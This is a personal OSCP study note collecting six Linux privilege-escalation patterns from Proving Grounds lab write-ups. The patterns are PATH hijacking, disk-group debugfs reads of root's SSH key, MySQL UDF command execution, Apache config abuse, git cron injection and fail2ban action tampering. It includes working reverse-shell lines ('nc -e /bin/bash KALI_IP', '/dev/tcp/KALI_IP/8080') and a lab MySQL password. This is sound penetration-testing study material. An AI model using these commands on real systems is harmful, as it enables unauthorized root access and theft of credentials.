---
title: "Advanced Linux PrivEsc Patterns — Beyond the Basics"
created: "2026-04-11"
updated: "2026-04-11"
type: permanent-note
status: active
tags:
  - permanent-note
  - privilege-escalation
  - linux
  - methodology
  - oscp
related:
  - "[[Linux-PrivEsc-Decision-Tree]]"
  - "[[SMB-Enumeration-Exploitation]]"
  - "[[Windows-PrivEsc-Decision-Tree]]"
---

# Advanced Linux PrivEsc Patterns — Beyond the Basics

**Core idea:** The Linux-PrivEsc-Decision-Tree covers the most common paths (sudo, SUID, cron, /etc/passwd). This note covers the less obvious escalation patterns that appear in OSCP-style boxes: PATH hijacking, disk group abuse, MySQL UDF injection, service user config abuse, and git repository cron manipulation.

> See [[Linux-PrivEsc-Decision-Tree]] for the priority checklist and common sudo/SUID/kernel paths.

---

## Pattern 1: PATH Hijacking via Vulnerable Binary

**When:** A SUID binary or sudo-allowed script calls another binary by name (not absolute path). You control `$PATH`. You can inject a fake binary that runs as root.

**From Inclusiveness writeup:**
```c
// rootshell.c — calls "whoami" without full path
FILE* f = popen("whoami", "r");
// If output == "tom" → grant root shell
```

**Attack:**
```bash
# Step 1: Create fake "whoami" that prints the target username
echo 'printf "tom"' > /tmp/whoami
chmod 777 /tmp/whoami

# Step 2: Prepend /tmp to PATH
export PATH=/tmp:$PATH

# Step 3: Run the vulnerable SUID binary
/home/tom/rootshell
# → Reads /tmp/whoami → prints "tom" → grants root
```

**Key condition:** `$PATH` must be inherited by the vulnerable program (it usually is for SUID binaries unless `secure_path` is set in sudoers).

---

## Pattern 2: Disk Group → Full Filesystem Read (debugfs)

**When:** Current user is in the `disk` group. Members of this group can read raw disk blocks.

**From Fanatastic writeup:**
```bash
# Check groups
id
# uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin),6(disk)

# Find which partition / is on
df -h
# /dev/sda2    9.8G  → this is /

# Use debugfs to read root's files
debugfs /dev/sda2
debugfs: cd /root
debugfs: cat /root/.ssh/id_rsa      # steal SSH key
debugfs: cat proof.txt              # read flag directly

# SSH as root using stolen key
chmod 600 id_rsa
ssh root@TARGET -i id_rsa
```

**What disk group means:** Full read (and write!) access to raw disk blocks. You can read `/root/.ssh/id_rsa`, `/etc/shadow`, or any file on the filesystem — without needing sudo or SUID.

---

## Pattern 3: MySQL UDF (User Defined Function) → Command Execution

**When:** You have MySQL root credentials (from web config) and the MySQL user is `root` or has FILE privilege. You can load a shared library that executes OS commands.

**From Banzai writeup:**
```bash
# Step 1: Transfer the UDF library
# Source: https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql
# Upload lib_mysqludf_sys_64.so via FTP to web root

# Step 2: Load it in MySQL
mysql -uroot -pEscalateRaftHubris123

mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/var/www/html/lib_mysqludf_sys_64.so'));
mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys_64.so';
mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys_64.so';

# Step 3: Execute OS command as MySQL user
mysql> select sys_exec('nc -e /bin/bash KALI_IP 22');
```

**Critical:** The `.so` file MUST go to `/usr/lib/mysql/plugin/` — not anywhere else. The MySQL `plugin_dir` setting controls where it looks.

**Root privilege:** MySQL often runs as root on vulnerable CTF boxes. `sys_exec()` runs commands as the MySQL service user — if that's root, you get root directly.

---

## Pattern 4: Apache Service Configuration Abuse

**When:** `sudo -l` shows the user can run `systemctl restart apache2` as root, AND the `apache2.conf` is world-writable.

**From Ha-natraj writeup:**
```bash
# Check what's writable
sudo -l
# → (ALL) NOPASSWD: /bin/systemctl restart apache2

ls -al /etc/apache2/apache2.conf
# -rwxrwxrwx  ← world-writable!

# Check who's running as apache user
cat /etc/apache2/apache2.conf | grep User
# User ${APACHE_RUN_USER}  ← maps to www-data

# Change User to target user
# Edit apache2.conf:
User mahakal
Group mahakal

# Restart Apache (triggers web shell as mahakal)
sudo /bin/systemctl restart apache2

# Trigger the LFI-based reverse shell again → now runs as mahakal
```

**Why this works:** Apache forks worker processes as the configured `User`. Changing it and restarting means the next web request executes as the new user — giving you lateral movement to a user with different (often higher) privileges.

---

## Pattern 5: Git Repository Cron Injection

**When:** A cron job runs a git-server-side script (like `backups.sh`). The script is inside a git repo you have write access to. You can push changes to overwrite the script.

**From Hunit writeup:**
```bash
# Cron job: root runs /root/git-server/backups.sh every 3 minutes

# Step 1: Find root's SSH key (in SMB share)
# Step 2: Clone the git server using that key
GIT_SSH_COMMAND='ssh -i id_rsa -p 43022' git clone git@TARGET:/git-server

# Step 3: Modify backups.sh with a reverse shell
echo '#!/bin/bash' > backups.sh
echo 'sh -i >& /dev/tcp/KALI_IP/8080 0>&1' >> backups.sh
git add -A
git commit -m "exp"

# Step 4: Push back to the server
GIT_SSH_COMMAND='ssh -i id_rsa -p 43022' git push origin master

# Step 5: Wait for cron → reverse shell as root
```

**The chain:** SMB share had root's SSH key → used key to clone git server → injected shell into tracked file → cron ran poisoned script as root.

---

## Pattern 6: Fail2ban Privilege Escalation

**When:** Fail2ban is running, and its action scripts are world-writable. Fail2ban runs actions as root when triggered.

```bash
# Check fail2ban actions for write access
ls -la /etc/fail2ban/action.d/

# If iptables-multiport.conf is writable:
# Modify the actionban command to spawn a shell
# Then trigger a ban by intentionally failing SSH logins
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://TARGET
# → fail2ban bans you → runs your modified actionban → root shell
```

---

## Connections

- [[Linux-PrivEsc-Decision-Tree]] — start here before these patterns
- [[SMB-Enumeration-Exploitation]] — Pattern 5 started with SSH key from SMB
- [[Reverse-Shell-Reference]] — reverse shell payloads used in all these patterns
- [[Password-Cracking-Methodology]] — MySQL creds from web config files
- [[Windows-PrivEsc-Decision-Tree]] — Windows equivalent path

---

*Extracted from 70+ Proving Grounds writeups (PG Play + PG Practice, 2023–2024)*
*Key boxes: Inclusiveness (PATH hijack), Fanatastic (disk group), Banzai (MySQL UDF), Ha-natraj (Apache conf), Hunit (git cron), Djinn3 (cron + authorized_keys)*
